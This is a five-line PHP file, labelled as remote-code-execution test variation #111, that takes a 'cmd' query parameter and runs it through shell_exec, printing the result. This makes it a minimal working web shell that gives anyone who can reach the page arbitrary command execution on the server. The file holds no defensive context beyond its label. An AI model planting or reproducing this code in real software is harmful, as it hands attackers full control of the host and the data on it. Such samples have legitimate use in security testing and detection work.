<?php
// RCE test variation #111
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>